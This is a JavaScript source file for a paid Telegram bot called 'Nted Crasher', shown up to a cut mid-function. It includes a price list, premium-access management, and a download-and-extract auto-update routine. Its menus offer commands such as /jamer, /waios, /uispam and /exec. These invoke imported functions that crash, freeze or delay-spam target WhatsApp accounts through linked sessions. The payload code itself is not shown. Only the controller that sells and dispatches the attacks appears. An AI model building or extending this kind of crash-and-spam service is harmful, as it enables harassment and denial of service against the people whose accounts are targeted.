process.on("unhandledRejection", (reason) => console.log("[ ANTI CRASH ] Unhandled Rejection:", reason));
process.on("uncaughtException", (err) => console.log("[ ANTI CRASH ] Uncaught Exception:", err));
process.on("uncaughtExceptionMonitor", (err) => console.log("[ ANTI CRASH MONITOR ]:", err));

require("./Config.js");

const {
  default:
  makeWASocket,
  baileys,
  useSingleFileAuthState,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  initInMemoryKeyStore,
  proto,
  generateWAMessage,
  generateWAMessageFromContent,
  generateWAMessageContent,
  generateMessageID,
  generateMessageTag,
  prepareWAMessageMedia,
  relayWAMessage,
  templateMessage,
  InteractiveMessage,
  WAMessage,
  WAMessageContent,
  WAMessageProto,
  WATextMessage,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  AnyMessageContent,
  MessageType,
  MessageTypeProto,
  Header,
  jidNormalizedUser,
  getContentType,
  areJidsSameUser,
  mentionedJid,
  processTime,
  URL_REGEX,
  BufferJSON,
  getStream,
  MediaType,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  WAMediaUpload,
  MediariyuInfo,
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  Presence,
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  WAContextInfo,
  ChatModification,
  waChatKey,
  Browser,
  Browsers,
  ProxyAgent,
  AuthenticationState,
  MiscMessageGenerationOptions,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  WAUrlInfo,
  BaileysError,
  isBaileys,
  DisriyuectReason,
  encodeSignedDeviceIdentity,
  jidEncode,
  jidDecode,
  encodeWAMessage,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  useMultiFileAuthState
} = require("@whiskeysockets/baileys");

const ownerFile = "./FileData/Own.json";
const BvGFile = "./FileData/Prem.json";

const file_session = "./Dist/active.json";

const question = (query) => new Promise((resolve) => {
  const rl = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
  });
  rl.question(query, (answer) => {
    rl.close();
    resolve(answer);
  });
});

const { 
 Jamer1,
 Jamer2,
 UiExecute,
 FreezeExecute,
 BlankExecute,
 DelaySpam1,
 DelaySpam2,
 DelaySpam3,
 DelayVip1,
 DelayVip2,
 DelayVip3,
 DelayVipLast,
 IosSpam,
 FrezeCht,
 payXcl1ck,
 frzInt,
 connectToWhatsApp,
 initializeWhatsAppConnections,
 saveActive,
 sessionPath,
 sessions,
 sock
} = require("./Dist/Ruang/FungsiBug.js");

const {
 isAdmin,
 runtime,
 toRupiah,
 getTime,
 formatNumber,
 pickRandom,
 sleep,
 randomID,
} = require("./Dist/Ruang/myfunc.js");

const { Telegraf, Markup, session } = require("telegraf");
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const FormData = require("form-data");
const fetch = require("node-fetch");
const cheerio = require("cheerio");
const util = require("util");
const moment = require('moment-timezone');
const pino = require('pino');
const chalk = require('chalk');
const crypto = require('crypto');
const AdmZip = require("adm-zip");
const os = require("os");
const { fromBuffer } = require("file-type")
const readline = require("readline");
const JsConfuser = require('js-confuser');
const https  = require("https");
const { parse } = require("acorn");

const bot = new Telegraf(Token);
let isWhatsAppConnected = false;

const GH_USER = "Nted3xec";
const GH_REPO = "kuk";
const BRANCH = "main";

let currentVersion = fs.existsSync("./version.txt")
  ? fs.readFileSync("./version.txt", "utf8").trim()
  : "1.0.0";

const VERSION_URL = `https://raw.githubusercontent.com/${GH_USER}/${GH_REPO}/${BRANCH}/version.json?nocache=${Date.now()}`;

bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next();

  const msg = ctx.message;

  const senderName =
    msg.from.first_name ||
    msg.from.username ||
    "Unknown User";

  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  const messageText = msg.text;

  const isGroup =
    msg.chat.type === "group" ||
    msg.chat.type === "supergroup";

  const groupName = isGroup ? msg.chat.title : "Private Chat";

  const date = new Date(msg.date * 1000)
    .toLocaleString("id-ID");

  console.clear();
  console.log(`
${chalk.hex("#00ffe1")("╔══════════════════════════════════════╗")}
${chalk.hex("#00ffe1")("║")} ${chalk.bold.hex("#ff00ff")(" ⚡ NTED • CRASHER LOGGER")} ${chalk.hex("#00ffe1")("  ║")}
${chalk.hex("#00ffe1")("╚══════════════════════════════════════╝")}

${chalk.green("📅 Tanggal   :")} ${chalk.white(date)}
${chalk.cyan("👤 Pengirim  :")} ${chalk.white(senderName)}
${chalk.cyan("🆔 User ID   :")} ${chalk.yellow(senderId)}

${chalk.blue("💬 Chat Type :")} ${
  isGroup
    ? chalk.magenta("GROUP")
    : chalk.green("PRIVATE")
}

${chalk.blue("🏷️ Chat Name :")} ${chalk.white(groupName)}
${chalk.blue("🧩 Chat ID   :")} ${chalk.yellow(chatId)}

${chalk.redBright("📨 Message   :")}
${chalk.whiteBright("➜ " + messageText)}

${chalk.hex("#00ffe1")("════════════════════════════════════════")}
`);

  return next();
});

//---------------( Bagian Akses )
function GetPotoRandom() {
  const Poto = [
    "https://smail.my.id/cloud/AKJ57Gui1",
    "https://smail.my.id/cloud/62MU6C9O1",
    "https://smail.my.id/cloud/VlwjjN5a1",
  ];

  return Poto[Math.floor(Math.random() * Poto.length)];
}

const ImgUrl = GetPotoRandom();

const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  try {
    const data = fs.readFileSync(file, "utf8");
    const parsed = JSON.parse(data);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.error("Error parsing JSON:", err);
    return [];
  }
};

const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error("Error saving JSON:", err);
  }
};
let ownerUsers = loadJSON(ownerFile);
let murbugUser = loadJSON(BvGFile);
let uptime = process.uptime();

const isOwner = (ctx) => ownerUsers.includes(ctx.from.id.toString());

const OwnerCheck = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
    return ctx.replyWithPhoto(ImgUrl, {
      caption: `
<blockquote>
Kamu tidak bisa memakai command ini, karna kamu tidak memiliki acces untuk command ini, silahkan lah minta add ke yang menjalankan script ini.
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜ Owner ⌟", url: "https://t.me/NtedCrasherExec" }],
          [{ text: "⌜ Channel ⌟", url: "https://t.me/SenjuUpdateNew" }, { text: "⌜ Group Chat ⌟", url: "https://t.me/NtedCrasherPublic" }]
        ]
      }
    });
  }
  return next();
};
const MurbugCheck = (ctx, next) => {
    if (!murbugUser.includes(ctx.from.id.toString())) {
        return ctx.replyWithPhoto(ImgUrl, {
      caption: `
<blockquote>
Kamu tidak bisa memakai command ini, karna kamu tidak memiliki acces untuk command ini, silahkan lah minta add ke yang menjalankan script ini.
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜ Owner ⌟", url: "https://t.me/NtedCrasherExec" }],
          [{ text: "⌜ Channel ⌟", url: "https://t.me/SenjuUpdateNew" }, { text: "⌜ Group Chat ⌟", url: "https://t.me/NtedCrasherPublic" }]
        ]
      }
    });
    }
    next();
};

const channelUsername = '@SenjuUpdateNew';

async function requireJoin(ctx, next) {
  try {
    const member = await ctx.telegram.getChatMember(channelUsername, ctx.from.id);
    if (['member', 'administrator', 'creator'].includes(member.status)) {
      return next();
    } else {
      return ctx.replyWithPhoto(
        { url: 'https://files.catbox.moe/qf79ju.jpg' }, 
        {
          caption: `
<blockquote>
Maaf bang ini khusus layanan nted, jika kamu belum mengikuti channel Nted maka tidak bisa lanju, ayo ikuti channel nted

CHANNEL: ${channelUsername}
</blockquote>`,
          parse_mode: 'HTML',
          reply_markup: {
          inline_keyboard: [
            [
              { text: "⌜ Channel ⌟", url: "https://t.me/SenjuUpdateNew" },
            ]
          ]
        }
      });
    }
  } catch (error) {
    console.error(error);
    return ctx.reply('Terjadi kesalahan saat memeriksa membership. Coba lagi nanti.');
  }
}


function loadPremiumGroups() {
  try {
    const data = fs.readFileSync("FileData/Group.json");
    return JSON.parse(data).groups.map(id => Number(id));
  } catch (err) {
    return [];
  }
}

function savePremiumGroups(groups) {
  fs.writeFileSync("FileData/Group.json",
    JSON.stringify({ groups: groups.map(id => Number(id)) }, null, 2)
  );
}

function loadPremiumUsers() {
  try {
    const data = fs.readFileSync("FileData/User.json");
    return JSON.parse(data).users.map(id => id.toString());
  } catch (err) {
    return [];
  }
}

function savePremiumUsers(users) {
  fs.writeFileSync("FileData/User.json",
    JSON.stringify({ users: users.map(id => id.toString()) }, null, 2)
  );
}

const AccessCheck = (ctx, next) => {
  const groups = loadPremiumGroups();
  const users = loadPremiumUsers();

  const chatId = Number(ctx.chat.id);
  const userId = ctx.from.id.toString();

  if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
    if (groups.includes(chatId)) {
      return next();
    } else {
      return ctx.replyWithPhoto(ImgUrl, {
        caption: `
<blockquote>
❌ Grup ini tidak memiliki akses premium.
Silahkan minta add ke owner script ini.
</blockquote>
`,
        parse_mode: "HTML",
        reply_markup: {
         inline_keyboard: [
          [{ text: "⌜ Owner ⌟", url: "https://t.me/NtedCrasherExec" }],
          [{ text: "⌜ Channel ⌟", url: "https://t.me/SenjuUpdateNew" }, { text: "⌜ Group Chat ⌟", url: "https://t.me/NtedCrasherPublic" }]
         ]
       }
      });
    }
  }

  if (ctx.chat.type === "private") {
    if (users.includes(userId)) {
      return next();
    } else {
      return ctx.replyWithPhoto(ImgUrl, {
        caption: `
<blockquote>
❌ Kamu tidak memiliki akses premium.
Silahkan minta add ke owner script ini.
</blockquote>
`,
        parse_mode: "HTML",
        reply_markup: {
        inline_keyboard: [
          [{ text: "⌜ Owner ⌟", url: "https://t.me/NtedCrasherExec" }],
          [{ text: "⌜ Channel ⌟", url: "https://t.me/SenjuUpdateNew" }, { text: "⌜ Group Chat ⌟", url: "https://t.me/NtedCrasherPublic" }]
        ]
      }
    });
  }
}
  return next();
};
//---------------( Bagian Other )
const badwords = ["anjing", "babi", "ngentod", "memek", "kontol", "mmq", "pepek", "ktl", "ngtd", "maklu"];

async function doUpdate(ctx, latestVersion, fileUrl) {
  try {
    const file = await axios.get(fileUrl, { responseType: "arraybuffer" });
    fs.writeFileSync("./update.zip", file.data);

    const zip = new AdmZip("./update.zip");
    zip.extractAllTo("./", true);
    fs.unlinkSync("./update.zip");

    // simpan versi terbaru ke file
    fs.writeFileSync("./version.txt", latestVersion);
    currentVersion = latestVersion;

    await ctx.replyWithPhoto(ImgUrl, {
      caption: `
<blockquote>
✅ Successfully update ke versi ${latestVersion}, sekarang anda tinggal ubah token dan id owner di panel anda
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "̊⌜ ᴄʜᴀɴɴᴇʟ ᴜᴘᴅᴀᴛᴇ ⌟", 
              url: "https://t.me/TceSupportID", 
              style: "primary",
              icon_custom_emoji_id: "4956371914323920049"
           },
          ]
        ]
      }
    });
  } catch (err) {
    await ctx.reply("❌ Gagal update: " + err.message);
  }
}
//---------------( Bagian Command )
bot.command('start', requireJoin, async (ctx) => {
const Thumbnail = "https://smail.my.id/cloud/AKJ57Gui1";
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
const pesan = `
<blockquote>
─( 👋 ) 안녕하세요、${name} | 𝐍𝐭ׁ𝐞̊𝐝̯̊͢٭̤͘𝐂̯̊͢𝐫̱𝐚̊𝐬̸𝐡͂𝐞̔͘𝐫̻͓͝

⌬ 소유자 : @NtedPakeE
⌬ 버전 : <b>Auto Update</b>
⌬ 접두사 : Slash
⌬ 플랫폼 : Telegram
⌬ 실행 시간 : ${runtime(uptime)}

𝐔𝐩𝐝𝐚𝐭𝐞 𝐕𝐞𝐫𝐬𝐢𝐨𝐧
✘ Auto Update
✘ Added New Function
✘ Multi Sender

Click the button below to continue to the next menu
</blockquote>
`;
    const keyboard = [
        [
          {
            text: "⌜ ᴏᴡɴᴇʀ ᴍᴇɴᴜ ⌟", 
            callback_data: "/control", 
            style: "danger",
            icon_custom_emoji_id: "4956371914323920049"
          },
          { 
              text: "⌜ ᴏᴛʜᴇʀ ᴍᴇɴᴜ ⌟", 
              callback_data: "/mainname", 
              style: "danger",
              icon_custom_emoji_id: "5210956308612820145"
           }
        ],
        [
          { 
              text: "⌜ sᴇʟᴇᴄᴛ ʙᴜɢ ⌟", 
              callback_data: "/bugname", 
              style: "success",
              icon_custom_emoji_id: "5373141891321699086"
           }
        ],
        [
           {
              text: "̊⌜ ᴄʜᴀɴɴᴇʟ ᴜᴘᴅᴀᴛᴇ ⌟", 
              url: "https://t.me/TceSupportID", 
              style: "primary",
              icon_custom_emoji_id: "4956371914323920049"
           },
           {
              text: "⌜ ᴘʀɪᴄᴇ sᴄʀɪᴘᴛ ⌟", 
              callback_data: "/harga", 
              style: "primary",
              icon_custom_emoji_id: "4956371914323920049"
           }
        ]
    ];

    ctx.replyWithPhoto(Thumbnail, {
        caption: pesan,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
         }
     });
     await ctx.replyWithAudio({
      source: "./Dist/Sound/Menu.mp3" },
    {
      title: "𝐍!𝐭̤͡𝐞ͅ𝐝͉ͬ͋٭̤̄̓͘𝐂̸𝐫͐͑𝐚͛𝐬̙𝐡̵𝐞̛𝐫͝",
      performer: "𝐍!𝐭̤͡𝐞ͅ𝐝͉ͬ͋٭̤̄̓͘𝐂̸𝐫͐͑𝐚͛𝐬̙𝐡̵𝐞̛𝐫͝",
      reply_to_message_id: ctx.message.message_id
    }
  );
});
bot.action('/back', async (ctx) => {
await ctx.answerCbQuery("Kembali ke menu awal")
const Thumbnail = "https://smail.my.id/cloud/VlwjjN5a1";
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
    const Menu = `
<blockquote>
─( 👋 ) 안녕하세요、${name} | 𝐍𝐭ׁ𝐞̊𝐝̯̊͢٭̤͘𝐂̯̊͢𝐫̱𝐚̊𝐬̸𝐡͂𝐞̔͘𝐫̻͓͝

⌬ 소유자 : @NtedPakeE
⌬ 버전 : <b>Auto Update</b>
⌬ 접두사 : Slash
⌬ 플랫폼 : Telegram
⌬ 실행 시간 : ${runtime(uptime)}

𝐔𝐩𝐝𝐚𝐭𝐞 𝐕𝐞𝐫𝐬𝐢𝐨𝐧
✘ Auto Update
✘ Added New Function
✘ Multi Sender

Click the button below to continue to the next menu
</blockquote>
`;

    const keyboard = [
        [
          {
            text: "⌜ ᴏᴡɴᴇʀ ᴍᴇɴᴜ ⌟", 
            callback_data: "/control", 
            style: "danger",
            icon_custom_emoji_id: "4956371914323920049"
          },
          { 
              text: "⌜ ᴏᴛʜᴇʀ ᴍᴇɴᴜ ⌟", 
              callback_data: "/mainname", 
              style: "danger",
              icon_custom_emoji_id: "5210956308612820145"
           }
        ],
        [
          { 
              text: "⌜ sᴇʟᴇᴄᴛ ʙᴜɢ ⌟", 
              callback_data: "/bugname", 
              style: "success",
              icon_custom_emoji_id: "5373141891321699086"
           }
        ],
        [
           {
              text: "̊⌜ ᴄʜᴀɴɴᴇʟ ᴜᴘᴅᴀᴛᴇ ⌟", 
              url: "https://t.me/TceSupportID", 
              style: "primary",
              icon_custom_emoji_id: "4956371914323920049"
           },
           {
              text: "⌜ ᴘʀɪᴄᴇ sᴄʀɪᴘᴛ ⌟", 
              callback_data: "/harga", 
              style: "primary",
              icon_custom_emoji_id: "4956371914323920049"
           }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: Thumbnail,
            caption: Menu,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "This menu is currently under construction so please be patient") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/harga', async (ctx) => {
const Thumbnail = "https://smail.my.id/cloud/62MU6C9O1";
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
    const Menu = `
<blockquote>
─( 👋 ) 안녕하세요、${name} | 𝐍𝐭ׁ𝐞̊𝐝̯̊͢٭̤͘𝐂̯̊͢𝐫̱𝐚̊𝐬̸𝐡͂𝐞̔͘𝐫̻͓͝

⌬ 소유자 : @NtedPakeE
⌬ 버전 : <b>Auto Update</b>
⌬ 접두사 : Slash
⌬ 플랫폼 : Telegram
⌬ 실행 시간 : ${runtime(uptime)}

─□ 𝐏𝐫𝐢𝐜𝐞 𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐜𝐄
□ sᴄʀɪᴘᴛ ɴᴏ ᴜᴘᴅᴀᴛᴇ: 10K
□ ғʀᴇᴇ ᴜᴘᴅᴀᴛᴇ 1x: 15K
□ ғʀᴇᴇ ᴜᴘᴅᴀᴛᴇ 3x: 25K
□ ᴘᴀᴛɴᴇʀ ɴᴛᴇᴅ: 80K

Ingin Membeli? Chat Owner Dibawah ini!
</blockquote>
`;
    const keyboard = [
        [
          {
              text: "⌜ ʙᴀᴄᴋ ᴛᴏ sᴛᴀʀᴛ ⌟", 
              callback_data: "/back", 
              style: "success",
              icon_custom_emoji_id: "5787498156828660380",
           },
           {
              text: "⌜ ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ ⌟", 
              url: "https://t.me/NtedCrasherExec",
              style: "success",
              icon_custom_emoji_id: "4956371914323920049"
           }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: Thumbnail,
            caption: Menu,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "This menu is currently under construction so please be patient") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/control', async (ctx) => {
await ctx.answerCbQuery("membuka menu control ⚙")
const Thumbnail = GetPotoRandom();
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
    const Menu = `
<blockquote>
─( 👋 ) 안녕하세요、${name}

<b>𝐍!𝐭̤͡𝐞ͅ𝐝͉ͬ͋٭̤̄̓͘𝐂̸𝐫͐͑𝐚͛𝐬̙𝐡̵𝐞̛𝐫͝</b>
⌬ 소유자 : @NtedPakeE
⌬ 버전 : <b>Auto Update</b>
⌬ 접두사 : Slash
⌬ 플랫폼 : Telegram
⌬ 실행 시간 : ${runtime(uptime)}

<b>𝐔𝐩𝐝𝐚𝐭𝐞 𝐂𝐨𝐧𝐭𝐫𝐨𝐥</b>
⿻ /updatesc - Update New Version
⿻ /cekversi - Cek Version Script

<b>𝑪̵̪𝒐̜𝒏𝒏͕̕𝒆͗𝒄𝒕̯̱̊͊٭ 𝑴̵𝒆͘͝͝𝒏͌𝒖̻</b>
⿻ /addno - Add Number
⿻ /delno - Delete Number
⿻ /list - Daftar Number

<b>̚𝐌𝐞̞̈𝐧͑͞𝐮̘ ٭ ͙𝐀̵̂𝐜́𝐜͑𝐞̈́𝐬̂</b>
⿻ /addown - Owner
⿻ /addprem - Premium
⿻ /addbug - Bebas Spam
⿻ /addgb - Group Prem
⿻ /delown - Delete Owner
⿻ /delprem - Delete Premiums
⿻ /delbug - Delete Spam
⿻ /delgb - Delete Gb Prem

</blockquote>
`;

    const keyboard = [
        [
          {
              text: "⌜ ʙᴀᴄᴋ ᴛᴏ sᴛᴀʀᴛ ⌟", 
              callback_data: "/back", 
              style: "success",
              icon_custom_emoji_id: "5787498156828660380",
           },
           {
              text: "⌜ ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ ⌟", 
              callback_data: "/harga", 
              style: "success",
              icon_custom_emoji_id: "4956371914323920049"
           }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: Thumbnail,
            caption: Menu,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "This menu is currently under construction so please be patient. ") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/bugname', async (ctx) => {
await ctx.answerCbQuery("membuka bug menu ⚡")
const Thumbnail = GetPotoRandom();
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
    const controlsMenu = `
<blockquote>
─( 👋 ) 안녕하세요、${name}</blockquote>

<blockquote>𝐍!𝐭̤͡𝐞ͅ𝐝͉ͬ͋٭̤̄̓͘𝐂̸𝐫͐͑𝐚͛𝐬̙𝐡̵𝐞̛𝐫͝</blockquote>
⌬ 소유자 : @NtedPakeE
⌬ 버전 : <b>Auto Update</b>
⌬ 접두사 : Slash
⌬ 플랫폼 : Telegram
⌬ 실행 시간 : ${runtime(uptime)}

<blockquote>═──( 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑩𝒖𝒈𝒔 )</blockquote>
<blockquote>️𝐎̵͘͝𝒏̍𝐥͝𝐲𝐕͆͝𝐢𝐩̏̎͝𝑬̦͟𝒙̐𝒆𝒄̓𝒖̼𝒕̻𝒊𝒐𝒏̊</blockquote>
⿻ /jamer - Crash New 2K26
⿻ /waios - Crash Invisible New

<blockquote>═──( 𝑴𝒖𝒓𝒃𝒖𝒈 𝑩𝒖𝒈𝒔 )</blockquote>
<blockquote>️𝑺̵𝒑̍𝒆͝𝒄𝒊͆𝒂𝒍̎͝𝑬̦͟𝒙̐𝒆𝒄̓𝒖̼𝒕̻𝒊𝒐𝒏̊</blockquote>
⿻ /delayed - Delay Bebas Spam V1
⿻ /dawg - Delay Bebas Spam V2
⿻ /uispam - Crash Ui Spam
⿻ /exec - Freeze Chat New

⚠️ Give the bot about 5 minutes to avoid delays. `;

    const keyboard = [
        [
            {
              text: "⌜ ʙᴀᴄᴋ ᴛᴏ sᴛᴀʀᴛ ⌟", 
              callback_data: "/back", 
              style: "success",
              icon_custom_emoji_id: "5787498156828660380" 
            },
            {
              text: "⌜ ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ ⌟", 
              callback_data: "/harga", 
              style: "success",
              icon_custom_emoji_id: "4956371914323920049"
           }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "This menu is currently under construction so please be patient. ") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/mainname', async (ctx) => {
await ctx.answerCbQuery("Membuka menu main 🎮")
const Thumbnail = GetPotoRandom();
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
    const tqtoMenu = `
<blockquote>─( 👋 ) 안녕하세요、${name}</blockquote>

<blockquote>𝐍!𝐭̤͡𝐞ͅ𝐝͉ͬ͋٭̤̄̓͘𝐂̸𝐫͐͑𝐚͛𝐬̙𝐡̵𝐞̛𝐫͝</blockquote>
⌬ 소유자 : @NtedPakeE
⌬ 버전 : <b>Auto Update</b>
⌬ 접두사 : Slash
⌬ 플랫폼 : Telegram
⌬ 실행 시간 : ${runtime(uptime)}

<blockquote>𝑴̣𝒆𝒏𝒖͠ ٭̤͘𝑶𝒕̄͠𝒉̸𝐞̛𝒓</blockquote>
⿻ /ig - Ig Downloader
⿻ /tiktok - TT Downloader
⿻ /iqc - Iphone Quoted
⿻ /pinterest - Pinterest Search 
⿻ /tourl - Convert Link
⿻ /cekid - User Stalking
⿻ /ping - Cek Awet Bot
`;

    const keyboard = [
        [
           {
              text: "⌜ ɢʀᴏᴜᴘ ᴍᴇɴᴜ ⌟", 
              callback_data: "/groups", 
              style: "success",
              icon_custom_emoji_id: "5787498156828660380" 
           },
           {
              text: "⌜ ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ ⌟", 
              callback_data: "/harga", 
              style: "success",
              icon_custom_emoji_id: "4956371914323920049"
           }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "This menu is currently under construction so please be patient. ") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/groups', async (ctx) => {
await ctx.answerCbQuery("Membuka menu Group ⚡")
const Thumbnail = GetPotoRandom();
const name = ctx.from.first_name || "User";
const userId = ctx.from.id.toString();
    const tqtoMenu = `
<blockquote>─( 👋 ) 안녕하세요、${name}</blockquote>

<blockquote>𝐍!𝐭̤͡𝐞ͅ𝐝͉ͬ͋٭̤̄̓͘𝐂̸𝐫͐͑𝐚͛𝐬̙𝐡̵𝐞̛𝐫͝</blockquote>
⌬ 소유자 : @NtedPakeE
⌬ 버전 : <b>Auto Update</b>
⌬ 접두사 : Slash
⌬ 플랫폼 : Telegram
⌬ 실행 시간 : ${runtime(uptime)}

<blockquote>𝑮̣𝒓𝒐𝒖͠𝒑 ٭̤͘𝑴̵𝒆͘͝͝𝒏͌𝒖̻</blockquote>
⿻ /mute - User Mute
⿻ /unmute - User Unmute
⿻ /ban - Blacklist User
⿻ /unban - UnBlacklist
⿻ /promote - Naikan Pangkat
⿻ /demote - Turunkan Pangkat
⿻ /antilink - Delete Mess Link
⿻ /antitoxic - Delete Mes Toxic
`;

    const keyboard = [
        [
           {
              text: "⌜ ʙᴀᴄᴋ ᴛᴏ sᴛᴀʀᴛ ⌟", 
              callback_data: "/back", 
              style: "success",
              icon_custom_emoji_id: "5787498156828660380" 
           },
           {
              text: "⌜ ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ ⌟", 
              callback_data: "/harga", 
              style: "success",
              icon_custom_emoji_id: "4956371914323920049"
           }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "This menu is currently under construction so please be patient. ") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
//##############################
bot.command('addown', OwnerCheck, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply(
`
<pre>間違いです。IDを入力してください。</pre>

<b>Example:</b>
/addown [ Target UserID ]

`, { parse_mode: "HTML" });
    }

    const userId = args[1];

    if (ownerUsers.includes(userId)) {
        return ctx.reply(
`
<pre>アクセスを許可しました</pre>
<b>UserID: ${userId}</b>

<pre>© 𝐌𝐚𝐫𝐠𝐚 𝐗𝐕 𖤐</pre>
`, { parse_mode: "HTML" });
    }

    ownerUsers.push(userId);
    saveJSON(ownerFile, ownerUsers);

    return ctx.reply(
`
<pre>アクセスを許可しました</pre>
<b>UserID: ${userId}</b>

<pre>© 𝐌𝐚𝐫𝐠𝐚 𝐗𝐕 𖤐</pre>
`, { parse_mode: "HTML" });
});
bot.command('delown', OwnerCheck, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply(
`\`\`\`
Send Id to remove Admin access
Example : /delown [ User Id ]
\`\`\``, { parse_mode: "MarkdownV2" });
    }

    const userId = args[1];

    if (!ownerUsers.includes(userId)) {
        return ctx.reply(
`
<blockquote>ユーザーがJSONファイルに存在しません</blockquote>

<b>Silahkan </b>
`, { parse_mode: "HTML" });
    }

    ownerUsers = ownerUsers.filter(id => id !== userId);
    saveJSON(ownerFile, ownerUsers);

    return ctx.reply(
`
<b>Successfully deleted the user, bro.</b>

<b>UserID: ${userId}</b>

<pre>© 𝐌𝐚𝐫𝐠𝐚 𝐗𝐕 𖤐</pre>
`, { parse_mode: "HTML" });
});
bot.command('addprem', OwnerCheck, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply(
`
<pre>間違いです。IDを入力してください。</pre>

<b>Example:</b>
/addprem [ Target UserID ]

`, { parse_mode: "HTML" });
    }

    const userId = args[1];

    if (murbugUser.includes(userId)) {
        return ctx.reply(
`
<pre>アクセスを許可しました</pre>
<b>UserID: ${userId}</b>

<pre>© 𝐌𝐚𝐫𝐠𝐚 𝐗𝐕 𖤐</pre>
`, { parse_mode: "HTML" });
    }

    murbugUser.push(userId);
    saveJSON(BvGFile, murbugUser);

    return ctx.reply(
`
<pre>アクセスを許可しました</pre>
<b>UserID: ${userId}</b>

<pre>© 𝐌𝐚𝐫𝐠𝐚 𝐗𝐕 𖤐</pre>
`, { parse_mode: "HTML" });
});
bot.command('delprem', OwnerCheck, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply(
`\`\`\`
Send Id to remove Admin access
Example : /delprem [ User Id ]
\`\`\``, { parse_mode: "MarkdownV2" });
    }

    const userId = args[1];

    if (!murbugUser.includes(userId)) {
        return ctx.reply(
`
<blockquote>ユーザーがJSONファイルに存在しません</blockquote>

<b>Silahkan </b>
`, { parse_mode: "HTML" });
    }

    murbugUser = murbugUser.filter(id => id !== userId);
    saveJSON(BvGFile, murbugUser);

    return ctx.reply(
`
<b>Successfully deleted the user, bro.</b>

<b>UserID: ${userId}</b>

<pre>© 𝐌𝐚𝐫𝐠𝐚 𝐗𝐕 𖤐</pre>
`, { parse_mode: "HTML" });
});
bot.command("addgb", OwnerCheck, (ctx) => {
  let groups = loadPremiumGroups();
  const chatId = Number(ctx.chat.id);

  if (!groups.includes(chatId)) {
    groups.push(chatId);
    savePremiumGroups(groups);
    return ctx.reply(
`
<blockquote>
N!ted Crasher Bot

Message: Successfully Add this group to a premium group, now all members can use the available premium features 
</blockquote>
`, { parse_mode: "HTML" });
  } else {
